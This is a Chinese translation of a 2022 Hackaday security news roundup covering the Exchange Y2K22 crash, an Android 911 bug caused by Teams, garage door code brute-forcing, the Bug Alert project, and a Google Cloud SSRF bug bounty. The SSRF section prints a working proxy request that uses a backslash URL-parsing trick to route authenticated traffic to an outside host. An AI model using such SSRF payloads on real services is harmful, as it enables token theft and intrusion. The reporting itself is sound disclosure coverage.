# 本周安全:Y2K22，意外阻塞 911，和错误警报

> 原文：<https://hackaday.com/2022/01/07/this-week-in-securityy2k22-accidentally-blocking-911and-bug-alert/>

如果你在过去的一周里不幸运行了微软的 Exchange 服务器，那么你不需要我[告诉你关于 Y2K22 问题](https://arstechnica.com/information-technology/2022/01/exchange-server-bug-gets-a-fix-after-ruining-admins-new-years-plans/)。为了赶上我们，当 Exchange 试图下载 2022 年的第一个恶意软件定义更新时，新定义的版本号触发了恶意软件检测引擎的崩溃。日期表示为字符串`2201010001`，其中前两位数字表示年份。这个字符串被转换成一个有符号的长整数，在`2,147,483,647`达到最大值。整数溢出，结果是未定义的行为，使引擎崩溃。服务器故障安全，不处理任何没有工作的恶意软件引擎的消息，这意味着没有电子邮件通过。新年快乐！

## Android 911 拒绝服务

拨打 911 寻求紧急服务几乎是软件漏洞显现的最糟糕的时间。谷歌刚刚在 1 月份的 Android 更新中修复了这样一个 bug。这是一种奇怪的意想不到的应用程序交互——在这种情况下，微软团队触发了 Android bug。如果安装了 Teams 应用程序，但没有帐户登录，Teams 会在每次启动时创建并注册一个新的`PhoneAccount`对象。这听起来很少见，但是 Android 上的团队也因为自发注销用户而臭名昭著。当你拨打 911 时，Android 运行一个例程来确定应该使用哪个`PhoneAccount`来路由呼叫，并通过比较哈希值来解决平局。这种比较只是一种幼稚的减法，意味着有 50%的机会得到否定的结果。这是没有预料到的，导致了崩溃。

## 车库门逆向工程

对一个有 30 年历史的无线授权方案进行逆向工程可能不是最引人注目的壮举，但有时这个过程本身就是一种奖励。[麦克斯韦·杜林]给我们带来了这个故事，这次旅行当然是值得的。这种攻击的基本原理仍然是可行的，从硬件开始。发送代码时按住接收器上的按钮，车库门与车库门遥控接收器同步。开启器内有九个双列直插式开关，每个开关有三个位置。他们是做什么的？他拿出他值得信赖的 SDR 来获取流量，并试图解码信号。Inspectrum 和 GNU Radio 是这里的英雄，让我们深入了解这个简单的认证方案。关于这个真正的车库门的结论？你可以通过发送每一个可能的连击来暴力破解一个未知代码，而且只需要 104 分钟。

## 错误警报

如果您是系统管理员，您知道有些问题需要立即采取行动。如果您运行 Java 服务器，Log4J 漏洞是对您的响应协议的一个考验。从公开披露到你听到它的时间，可能已经足够引发灾难。虽然有多种错误报告服务和框架，但没有一种非常适合这种利基用例:尽快通知您您的头发可能真的着火了。这个空缺的职位吸引了马修·沙利文，他宣布了一个新项目，Bug Alert。它都是开源的，所以如果你真的想的话，你可以托管你自己的实例。你可以选择发推文，发短信，甚至打电话。这有可能成为一个有用的工具，看看吧！

我觉得我需要让 Bug 警报触发[一首奇怪的艾尔歌曲……](https://www.youtube.com/watch?v=zvfD5rnkTws)

## 僵尸 SSRF

[David Schütz]正在[搜索晦涩难懂的谷歌 API](https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/)，并发现了`jobs.googleapis.com`，你可以自己演示。这个演示很有趣，因为它不是一个完全充实的服务，而是与真正的后端对话。请求通过代理`cxl-services.appspot.com`，它处理演示页面的认证步骤。如果他能触发一个服务器端请求伪造(SSRF)，他也许能得到经过验证的请求，也许能欺骗代理代表他发送流量。URL 解析很难。成功的诀窍？url 中的反斜杠。`GET /proxy?url=https://sfmnev.vps.xdavidhu.me\@jobs.googleapis.com/ HTTP/1.1`

手里拿着一个访问令牌，[David]开始仔细研究其他 Google APIs，看看这个令牌让他可以访问什么。他给出了我们之前提到过的警告，小心你推的距离。他本可以立即报告这个 bug，但是想要确认他实际上有一个实时访问令牌。在确认令牌可用于读取访问后，他上交了这一发现，净赚了 3133.70 美元，此外还因出色的报告和对横向移动的仔细观察获得了 1000 美元的额外奖励。仅此而已，对吧？没有。就在 90 天披露截止日期之前，[David]发现了一个修复旁路。在反斜杠和@之间添加任何文本都足以打破它。又是 3133.70 美元。只是为了好玩，他探测了旧的网址，修复后不应该在服务中。是的，他发现了另一个安全令牌，净赚了 3133.70 美元。这个僵尸 SSRF 还没死，[推特上的证据](https://twitter.com/xdavidhu/status/1477664931877163010):

> 我告诉过你，它是不可修复的！ [@n1nj4sec](https://twitter.com/n1nj4sec?ref_src=twsrc%5Etfw) 已经绕过了修复。太酷了！你会是第四个绕过它并获得$3k 的人吗？😎解析一个网址真的很难。pic.twitter.com/5xmg5tbybw
> 
> —大卫·舒茨(@ xdavidhu)[2022 年 1 月 2 日](https://twitter.com/xdavidhu/status/1477664931877163010?ref_src=twsrc%5Etfw)